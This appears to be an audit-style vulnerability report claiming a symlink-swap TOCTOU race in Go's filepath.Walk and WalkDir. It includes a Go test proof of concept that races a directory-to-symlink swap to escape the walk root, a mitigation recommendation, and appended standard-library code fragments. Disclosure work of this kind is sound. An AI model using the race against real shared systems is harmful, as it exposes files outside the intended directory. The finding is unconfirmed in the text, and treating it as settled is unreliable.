### Title
TOCTOU symlink-race in `filepath.Walk`/`filepath.WalkDir` allows directory-scan escape - ([File: src/path/filepath/path.go])

### Summary
`filepath.Walk` and `filepath.WalkDir` decide whether to descend into a path using `os.Lstat`, then later open that same path with `os.Open` (via `readDirNames`) or `os.ReadDir` to list its contents. Between the `Lstat` check and the `Open`/`ReadDir` call, an attacker who can rename/replace a directory entry in the tree being scanned can swap a real directory for a symlink pointing outside the walk root, causing the walker's subsequent open to follow the symlink and enumerate/descend into files outside the intended tree — the same lstat-then-opendir TOCTOU class as the rsync CVE.

### Finding Description
- Entry points: `filepath.Walk(root, fn)` and `filepath.WalkDir(root, fn)` in `src/path/filepath/path.go`.
- `walk()` calls `readDirNames(path)` [1](#0-0)  which does `os.Open(dirname)` followed by `Readdirnames` [2](#0-1) . `walkDir()` similarly calls `os.ReadDir(path)` [3](#0-2) .
- The decision to treat `path` as a directory worth opening comes from an earlier `lstat`/`Lstat` call on that same path (`var lstat = os.Lstat` used in `walk`, and `os.Lstat` used at the top level of `walkDir`) [4](#0-3) [5](#0-4) .
- Neither `os.Open` nor `os.ReadDir`, as used here, pass `O_NOFOLLOW`/verify the inode identity of the previously-lstat'd entry, so if the on-disk entry is swapped from a real directory to a symlink (or vice versa) in the window between the `Lstat` and the `Open`/`ReadDir`, the walker will silently follow the symlink target, exactly mirroring the rsync sender bug where a symlink swapped in between `lstat()` and `opendir()` lets the scanner escape the intended subtree.
- This is the same primitive as `os.Root`'s documented `openat`-based mitigation on Unix (open with `O_NOFOLLOW` and `checkSymlink` against the already-opened parent fd) [6](#0-5) ; `filepath.Walk`/`WalkDir` do not use that path-based-race-resistant mechanism and are documented only as "does not follow symbolic links" without any TOCTOU protection [7](#0-6) [8](#0-7) .

### Impact Explanation
A victim process that walks an attacker-influenced directory tree (e.g., extracted archive, shared upload directory, or any tree where an unprivileged co-tenant can create/rename entries concurrently with the walk) can be tricked into enumerating and opening files outside the intended root, leading to cross-directory information disclosure of file names/content the caller processes during the walk (e.g., checksum tools, backup tools, static site generators, build tools that read file contents inside the walk callback). This matches a `PRIVATE` or `PUBLIC`-track disclosure bug under Go's process, similar in class (though generally lower severity, since `filepath.Walk` callers rarely delete/serve data purely from the walk) to the rsync advisory it mirrors.

### Likelihood Explanation
Requires an attacker with write access to a location within (or adjacent to, via a symlink swap) the directory tree being walked, and requires winning a race window between two syscalls — this is a realistic but non-trivial local/multi-tenant race, not remotely triggerable over the network by itself. It is directly analogous to the "attacker who can create or manipulate symlinks in a path component of the scanned tree" precondition in the rsync CVE.

### Recommendation
Have `filepath.Walk`/`WalkDir` avoid re-resolving path components by name: open directories via file descriptors obtained from the parent (`openat`-style, as `os.Root` already does) rather than lstat-by-path followed by open-by-path, or re-verify the inode/device of the opened directory matches the previously lstat'd entry before descending.

### Proof of Concept
```go
package filepath_test

import (
	"os"
	"path/filepath"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// TestWalkSymlinkRace demonstrates a TOCTOU window between Lstat and the
// later os.Open/os.ReadDir of the same path inside filepath.Walk.
func TestWalkSymlinkRace(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	secret := filepath.Join(outside, "secret")
	if err := os.WriteFile(secret, []byte("outside-data"), 0o600); err != nil {
		t.Fatal(err)
	}

	victim := filepath.Join(root, "victim")
	if err := os.Mkdir(victim, 0o777); err != nil {
		t.Fatal(err)
	}

	var stop atomic.Bool
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		for !stop.Load() {
			os.RemoveAll(victim)
			os.Symlink(outside, victim) // swap dir -> symlink pointing outside root
			os.Remove(victim)
			os.Mkdir(victim, 0o777) // swap back
		}
	}()

	var sawOutsideFile bool
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) && !sawOutsideFile {
		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err == nil && filepath.Base(path) == "secret" {
				sawOutsideFile = true
			}
			return nil
		})
	}
	stop.Store(true)
	wg.Wait()

	if !sawOutsideFile {
		t.Skip("race window not hit in this run; rerun or increase iterations")
	}
	t.Fatalf("filepath.Walk escaped root %q and observed outside file %q", root, secret)
}
```
Expected assertion: on a hit, `Walk`'s callback observes `secret` from `outside`, proving the walker followed a symlink swapped in after the `Lstat` check that classified `victim` as a plain directory — the same lstat/opendir race class described in the rsync advisory.

// readDirNames reads the directory named by dirname and returns
// a sorted list of directory entry names.
func readDirNames(dirname string) ([]string, error) {
	f, err := os.Open(dirname)
	if err != nil {
		return nil, err
	}
	names, err := f.Readdirnames(-1)
	f.Close()
	if err != nil {
		return nil, err
	}
	slices.Sort(names)
	return names, nil
}

func rootOpenDir(parent int, name string) (int, error) {
	var (
		fd  int
		err error
	)
	ignoringEINTR(func() error {
		fd, err = unix.Openat(parent, name, syscall.O_NOFOLLOW|syscall.O_CLOEXEC|syscall.O_DIRECTORY, 0)
		if isNoFollowErr(err) || err == syscall.ENOTDIR {
			err = checkSymlink(parent, name, err)
		} else if err == syscall.ENOTSUP || err == syscall.EOPNOTSUPP {
			// ENOTSUP and EOPNOTSUPP are often, but not always, the same errno.
			// Translate both to ENOTDIR, since this indicates a non-terminal
			// path component was not a directory.
			err = syscall.ENOTDIR
		}
		return err
	})
	return fd, err
}
